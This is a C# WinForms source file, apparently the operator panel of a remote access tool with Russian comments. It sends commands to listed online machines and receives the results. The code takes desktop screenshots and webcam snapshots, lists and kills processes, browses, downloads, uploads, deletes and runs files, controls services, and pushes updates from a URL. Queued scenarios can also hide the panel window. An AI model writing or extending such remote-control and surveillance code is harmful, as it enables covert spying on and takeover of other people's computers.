using System;
using System.IO;
using Client.Properties;
using System.Windows.Forms;
using System.Threading;

namespace Client
{
    public partial class Form_Client : Form
    {
        Thread ThMail, ThHost, ThUpdateOnlineList;
        string CurrentPath;

        public Form_Client()
        {
            InitializeComponent();

            ThHost = new Thread(StartThHost) { IsBackground = true };
            ThHost.Start();
            ThUpdateOnlineList = new Thread(StartThUpdateOnlineList) { IsBackground = true };
            ThUpdateOnlineList.Start();

            if (!Directory.Exists(Directory.GetCurrentDirectory() + @"\files"))
                Directory.CreateDirectory(Directory.GetCurrentDirectory() + @"\files");
            if (!Directory.Exists(Directory.GetCurrentDirectory() + @"\screenshots"))
                Directory.CreateDirectory(Directory.GetCurrentDirectory() + @"\screenshots");
        }

        private void StartThHost()
        {
            while (true)
            {
                try
                {
                    string get = Command.CheckResult();
                    if (get == "IndexError")
                        continue; // Пропускаем если нет команд
                    
                    string flag = get.Substring(get.IndexOf('@') + 1, 2);
                    string username = get.Substring(0, get.IndexOf('@'));
                    string result = get.Substring(get.IndexOf('@') + 3);

                    if (flag == "$S" || flag == "@L" || flag == "$W")
                    {
                        int count = 0;
                        foreach (string a in Directory.EnumerateFiles(Directory.GetCurrentDirectory() + @"\screenshots"))
                            count++; // Считаем кол-во файлов, и получаем число которое используем в имени файла для избежания повторения имен

                        // Настраиваем FileStream для разных типов файлов
                        FileStream file;

                        if (flag == "$S")
                            file = new FileStream(Directory.GetCurrentDirectory() + @"\screenshots\desktop_screenshot - " + count.ToString() + ".jpeg", FileMode.CreateNew, FileAccess.ReadWrite, FileShare.None);
                        else if (flag == "@L")
                            file = new FileStream(Directory.GetCurrentDirectory() + @"\files\" + ListBoxFile.SelectedItem.ToString(), FileMode.CreateNew, FileAccess.ReadWrite, FileShare.None);
                        else
                            file = new FileStream(Directory.GetCurrentDirectory() + @"\screenshots\webcam_snapshot - " + count.ToString() + ".jpeg", FileMode.CreateNew, FileAccess.ReadWrite, FileShare.None);

                        file.Close(); // Закрываем FileStream

                        ButtonStartCommand.Enabled = true;

                        if (flag == "$S")
                            RTxtLog.Text += $"{DateTime.Now.ToShortTimeString()}: Ответ клиента: Cкриншот desktop_screenshot-{count.ToString()}.jpeg получен. \n\n";
                        else if (flag == "@L")
                            RTxtLog.Text += $"{DateTime.Now.ToShortTimeString()}: Ответ клиента: Файл {ListBoxFile.SelectedItem.ToString()} получен. \n\n";
                        else
                            RTxtLog.Text += $"{DateTime.Now.ToShortTimeString()}: Ответ клиента: Cкриншот webcam_snapshot-{count.ToString()}.jpeg получен. \n\n";
                    }
                    /*else
                    {
                        RTxtLog.Text += $"{DateTime.Now.ToShortTimeString()}: Ответ сервера: {result} \n\n";
                    }*/

                    if (flag == "$P") // Process
                    {
                        ListBoxProcess.Items.Clear();
                        string text = result;

                        try
                        {
                            while (true) // В цикле заведомо предусмотренно исключение, возникающее когда заканчиваются строки для считывания
                            {
                                int index = text.IndexOf("|");
                                string message = text.Substring(0, index);
                                text = text.Remove(0, index + 1);
                                ListBoxProcess.Items.Add(message);
                            }
                        }
                        catch { }
                    }

                    if (flag == "$C")
                    {
                        ListBoxCatalog.Items.Clear();
                        string catalogs = result;

                        try
                        {
                            while (true) // В цикле заведомо предусмотренно исключение, возникающее когда заканчиваются строки для считывания
                            {
                                int index = catalogs.IndexOf("|");
                                string message = catalogs.Substring(0, index);
                                catalogs = catalogs.Remove(0, index + 1);

                                if (CurrentPath != null)
                                {
                                    int index2 = message.LastIndexOf("\\");
                                    message = message.Remove(0, index2 + 1);
                                }

                                ListBoxCatalog.Items.Add(message);
                            }
                        }
                        catch
                        {
                            if (CurrentPath != null)
                                if (CurrentPath.Substring(CurrentPath.Length - 1) != "\\")
                                    CurrentPath += "\\";

                            TxtPathCatalog.Text = CurrentPath;
                        }
                    }

                    if (flag == "$F")
                    {
                        ListBoxFile.Items.Clear();
                        string files = result;

                        try
                        {
                            while (true) // В цикле заведомо предусмотренно исключение, возникающее когда заканчиваются строки для считывания
                            {
                                int index = files.IndexOf("|");
                                string message = files.Substring(0, index);
                                files = files.Remove(0, index + 1);

                                if (CurrentPath != null)
                                {
                                    int index2 = message.LastIndexOf("\\");
                                    message = message.Remove(0, index2 + 1);
                                }

                                ListBoxFile.Items.Add(message);
                            }
                        }
                        catch { }
                    }

                    // Задержка в цикле чтобы снизить нагрузку на процессор (без задержки 25% нагрузки постоянно, с ней 0-3% при условии 100мс)
                    Thread.Sleep(100);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
        }

        private void StartThUpdateOnlineList()
        {
            while (true)
            {
                try
                {
                    string result = Command.OnlineCheck();

                    ListBoxOnlineUsers.Items.Clear();

                    try
                    {
                        while (true) // В цикле заведомо предусмотренно исключение, возникающее когда заканчиваются строки для считывания
                        {
                            int index = result.IndexOf("|");
                            string message = result.Substring(0, index);
                            result = result.Remove(0, index + 1);

                            /*if (CurrentPath != null)
                            {
                                int index2 = message.LastIndexOf("\\");
                                message = message.Remove(0, index2 + 1);
                            }*/

                            ListBoxOnlineUsers.Items.Add(message);
                        }
                    }
                    catch { }


                    Thread.Sleep(10000);
                }
                catch (Exception ex)
                {
                    MessageBox.Show(ex.ToString());
                }
            }
        }

        private void StartCommand(string text, string flag)
        {
            try
            {
                // Блокируем панель чтобы избежать повторного нажатия во время получения данных
                TabControl.Enabled = false;
                RTxtLog.Text += Command.Add($"command={text}&user={TextBoxCurrentUser.Text}") + "\n\n";
            }
            catch (Exception ex)
            {
                RTxtLog.Text += $"{DateTime.Now.ToShortTimeString()}: Ошибка клиента: {ex.Message} \n\n";
            }
            finally
            {
                // Включаем панель
                TabControl.Enabled = true;
                // Скролим вниз RichTextBox чтобы видеть актуальную запись
                RTxtLog.SelectionStart = RTxtLog.TextLength;
                RTxtLog.ScrollToCaret();
            }
        }

        private string SelectPath(byte mode)
        {
            if (mode == 1)
                return string.Format("{0}{1}", TxtPathCatalog.Text, ListBoxFile.SelectedItem.ToString());
            if (mode == 2)
                return string.Format("{0}{1}", TxtPathCatalog.Text, ListBoxCatalog.SelectedItem.ToString());
            else
                return null;
        }

        private void TxtCommand_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
                StartCommand();
        }

        private void StartCommand()
        {
            StartCommand(TxtCommand.Text, TxtFlag.Text);
            TxtCommand.Text = null;
            TxtFlag.Text = null;
        }

        private void ButtonStartCommand_Click(object sender, EventArgs e)
        {
            ButtonFocus.Focus();
            StartCommand();
        }

        private void ButtonClear_Click(object sender, EventArgs e)
        {
            ButtonFocus.Focus();
            RTxtLog.Text = null;
        }

        private void ButtonGetObject_Click(object sender, EventArgs e)
        {
            GroupBoxGetObject.Focus();
            if (RadioButtonScreen.Checked)
                StartCommand("$S", "$S");
            if (RadioButtonProcess.Checked)
                StartCommand("$P", "$P");
            if (RadioButtonWebCam.Checked)
                StartCommand("$W", "$W");
        }

        private void ButtonUpload_Click(object sender, EventArgs e)
        {
            GroupBoxUpload.Focus();
            StartCommand($"@FU{TxtID.Text}|{TxtFileName.Text}", "@FU");
        }

        private void Form_Client_FormClosing(object sender, FormClosingEventArgs e)
        {
            Settings.Default.Save();
        }

        private void UpdateCatalog(string path)
        {
            StartCommand("$C" + path, "$C");
            if (path != null)
                StartCommand("$F" + path, "$F");
            CurrentPath = path;
        }

        private void ListBoxCatalog_DoubleClick(object sender, EventArgs e)
        {
            if (ListBoxCatalog.SelectedItem != null)
                UpdateCatalog(TxtPathCatalog.Text + ListBoxCatalog.SelectedItem.ToString());
        }

        private void BackCatalog()
        {
            ListBoxCatalog.Focus();
            if (TxtPathCatalog.Text.Length > 3)
            {
                TxtPathCatalog.Text = TxtPathCatalog.Text.Remove(TxtPathCatalog.Text.LastIndexOf("\\") - 1);
                TxtPathCatalog.Text = TxtPathCatalog.Text.Remove(TxtPathCatalog.Text.LastIndexOf("\\"));
                string s = TxtPathCatalog.Text.Substring(TxtPathCatalog.Text.Length - 1);
                if (s == ":")
                    TxtPathCatalog.Text += "\\";
                UpdateCatalog(TxtPathCatalog.Text);
            }
            else
            {
                UpdateCatalog(null);
            }
        }

        private void ButtonBack_Click(object sender, EventArgs e)
        {
            BackCatalog();
        }

        private void ConMenuFileCreate_Click(object sender, EventArgs e)
        {
            Form_WriteText f = new Form_WriteText("Создать файл", null, 2);
            f.ShowDialog();
            if (f.TrueExit)
            {
                StartCommand($"@FC{TxtPathCatalog.Text}{f.PathOne}", "@FC");
                UpdateCatalog(TxtPathCatalog.Text);
            }
        }

        private void ConMenuFileDelete_Click(object sender, EventArgs e)
        {
            StartCommand($"@FD{SelectPath(1)}", "@FD");
            UpdateCatalog(TxtPathCatalog.Text);
        }

        private void ConMenuFileRename_Click(object sender, EventArgs e)
        {
            Form_WriteText f = new Form_WriteText("Переименовать файл", ListBoxFile.SelectedItem.ToString(), 1);
            f.ShowDialog();
            if (f.TrueExit)
            {
                StartCommand($"@FM{SelectPath(1)}|{TxtPathCatalog.Text}{f.PathTwo}", "@FM");
                UpdateCatalog(TxtPathCatalog.Text);
            }
        }

        private void ConMenuFileMove_Click(object sender, EventArgs e)
        {
            Form_WriteText f = new Form_WriteText("Переместить файл", SelectPath(1), 1);
            f.ShowDialog();
            if (f.TrueExit)
            {
                StartCommand($"@FM{f.PathOne}|{f.PathTwo}", "@FM");
                UpdateCatalog(TxtPathCatalog.Text);
            }
        }

        private void ConMenuFileDownload_Click(object sender, EventArgs e)
        {
            StartCommand($"@FL{SelectPath(1)}", "@L");
        }

        private void ConMenuFileStart_Click(object sender, EventArgs e)
        {
            Form_WriteText f = new Form_WriteText("Запустить файл", SelectPath(1), 1);
            f.ShowDialog();
            if (f.TrueExit)
            {
                if (f.PathTwo == null)
                    StartCommand($"@FS{SelectPath(1)}", "@FS");
                else
                    StartCommand($"@FS{SelectPath(1)}|{f.PathTwo}", "@FS");
            }
        }

        private void ConMenuDirCreate_Click(object sender, EventArgs e)
        {
            Form_WriteText f = new Form_WriteText("Создать папку", null, 2);
            f.ShowDialog();
            if (f.TrueExit)
            {
                StartCommand($"@DC{TxtPathCatalog.Text}{f.PathOne}", "@DC");
                UpdateCatalog(TxtPathCatalog.Text);
            }
        }

        private void ConMenuDirDelete_Click(object sender, EventArgs e)
        {
            StartCommand($"@DD{SelectPath(2)}", "@DD");
            UpdateCatalog(TxtPathCatalog.Text);
        }

        private void ConMenuDirRename_Click(object sender, EventArgs e)
        {
            Form_WriteText f = new Form_WriteText("Переименовать папку", ListBoxCatalog.SelectedItem.ToString(), 1);
            f.ShowDialog();
            if (f.TrueExit)
            {
                StartCommand($"@DM{SelectPath(2)}|{TxtPathCatalog.Text}{f.PathTwo}", "@DM");
                UpdateCatalog(TxtPathCatalog.Text);
            }
        }

        private void ConMenuDirMove_Click(object sender, EventArgs e)
        {
            Form_WriteText f = new Form_WriteText("Переместить папку", SelectPath(2), 1);
            f.ShowDialog();
            if (f.TrueExit)
            {
                string path2;
                if (f.PathTwo.Substring(f.PathTwo.Length) != "\\")
                    path2 = f.PathTwo + "\\" + ListBoxCatalog.SelectedItem.ToString();
                else
                    path2 = f.PathTwo + ListBoxCatalog.SelectedItem.ToString();
                StartCommand($"@DM{f.PathOne}|{path2}", "@DM");
                UpdateCatalog(TxtPathCatalog.Text);
            }
        }

        private void ConMenuDirZipping_Click(object sender, EventArgs e)
        {
            StartCommand($"@UZ{SelectPath(2)}", "@DZ");
            UpdateCatalog(TxtPathCatalog.Text);
        }

        private void ConMenuFileUnZipping_Click(object sender, EventArgs e)
        {
            Form_WriteText f = new Form_WriteText("Разархивация", SelectPath(1), 1);
            f.ShowDialog();
            if (f.TrueExit)
            {
                StartCommand($"@UU{SelectPath(1)}|{f.PathTwo}", "@DZ");
                UpdateCatalog(TxtPathCatalog.Text);
            }
        }

        private void ConMenuProcStart_Click(object sender, EventArgs e)
        {
            Form_WriteText f = new Form_WriteText("Запуск процесса", null, 2);
            f.ShowDialog();
            if (f.TrueExit)
            {
                StartCommand($"@FS{f.PathOne}", "@FS");
                StartCommand("$P", "$P");
            }
        }

        private void ConMenuProcClose_Click(object sender, EventArgs e)
        {
            StartCommand($"$K{ListBoxProcess.SelectedItem.ToString()}", "$K");
            StartCommand("$P", "$P");
        }

        private void ButtonSCStartCommand_Click(object sender, EventArgs e)
        {
            GroupBoxServerControl.Focus();

            switch (ComboBoxSC.SelectedIndex)
            {
                case 0:
                    StartCommand("c" + TxtSCPathOne.Text, "*c");
                    break;
                case 1: // Включить службу
                    StartCommand("s" + TxtSCPathOne.Text, "*s");
                    break;
                case 2: // Выключить службу
                    StartCommand("d" + TxtSCPathOne.Text, "*d");
                    break;
                case 3: // Перезапустить службу
                    StartCommand("r" + TxtSCPathOne.Text, "*r");
                    break;
                case 4: // Запустить процесс
                    StartCommand("p" + TxtSCPathOne.Text, "*p");
                    break;
                case 5: // Переместить файл
                    StartCommand($"m{TxtSCPathOne.Text}|{TxtSCPathTwo.Text}", "*m");
                    break;
                case 6:
                    StartCommand("l", "*l");
                    break;
            }
        }

        private void ComboBoxSC_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (ComboBoxSC.SelectedIndex)
            {
                case 0:
                    TxtSCPathOne.Enabled = false;
                    TxtSCPathTwo.Enabled = false;
                    break;
                case 1: // Включить службу
                case 2: // Выключить службу
                case 3: // Перезапустить службу
                case 4: // Запустить процесс
                    TxtSCPathOne.Enabled = true;
                    TxtSCPathTwo.Enabled = false;
                    break;
                case 5: // Переместить файл
                    TxtSCPathTwo.Enabled = true;
                    break;
                case 6:
                    TxtSCPathOne.Enabled = false;
                    TxtSCPathTwo.Enabled = false;
                    break;
            }
        }

        private void Form_Client_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Back && TabControl.SelectedTab.Text == "Каталоги" && !TxtPathCatalog.Focused)
                BackCatalog();
            if (e.KeyCode == Keys.Enter && TabControl.SelectedTab.Text == "Каталоги" && !TxtPathCatalog.Focused)
                if (ListBoxCatalog.SelectedItem != null)
                    UpdateCatalog(TxtPathCatalog.Text + ListBoxCatalog.SelectedItem.ToString());
        }

        private void TabControl_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (TabControl.SelectedIndex == 1 && TxtPathCatalog.Text == "")
                UpdateCatalog(null);
        }

        private void TxtPathCatalog_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
                UpdateCatalog(TxtPathCatalog.Text);
        }

        private void ButtonStartScenario_Click(object sender, EventArgs e)
        {
            foreach (object obj in ListBoxScenario.Items)
            {
                if (obj.ToString().Contains("hide"))
                    Hide();

                if (obj.ToString().Contains("sleep"))
                    System.Threading.Thread.Sleep(Convert.ToInt32(obj.ToString().Substring(6)));

                StartCommand(obj.ToString(), null);
            }
        }

        private void ButtonDelScenarioCommand_Click(object sender, EventArgs e)
        {
            ListBoxScenario.Items.Remove(ListBoxScenario.SelectedItem);
        }

        private void ListBoxOnlineUsers_SelectedIndexChanged(object sender, EventArgs e)
        {
            TextBoxCurrentUser.Text = ListBoxOnlineUsers.SelectedItem.ToString();
        }

        private void ButtonAddScenarioCommand_Click(object sender, EventArgs e)
        {
            if (TxtCommandScenario.Text != "" || TxtCommandScenario.Text != null)
                ListBoxScenario.Items.Add(TxtCommandScenario.Text);
        }

        private void ButtonUpdate_Click(object sender, EventArgs e)
        {
            GroupBoxUpdate.Focus();
            StartCommand("u" + TxtUrlUpdate.Text, "*u");
            TxtUrlUpdate.Text = null;
        }
    }
}